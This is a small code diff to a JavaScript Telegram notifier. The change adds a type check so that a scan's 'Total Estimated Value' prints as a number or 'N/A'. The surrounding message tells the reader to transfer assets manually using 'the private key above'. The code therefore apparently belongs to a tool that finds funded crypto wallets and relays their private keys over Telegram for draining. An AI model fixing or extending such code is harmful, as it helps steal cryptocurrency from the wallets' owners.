@@ -195,7 +195,10 @@ class TelegramNotifier {
         }
       }
 
-      message += `<b>Total Estimated Value:</b> $${scanResults.summary.estimatedValue.toFixed(2)}\n\n`;
+      const estimatedValue = typeof scanResults.summary.estimatedValue === 'number' 
+        ? scanResults.summary.estimatedValue.toFixed(2) 
+        : (scanResults.summary.estimatedValue || 'N/A');
+      message += `<b>Total Estimated Value:</b> $${estimatedValue}\n\n`;
       message += `⚠️ <b>Manual Transfer Required</b>\n`;
       message += `Please transfer assets manually using the private key above.`;
 
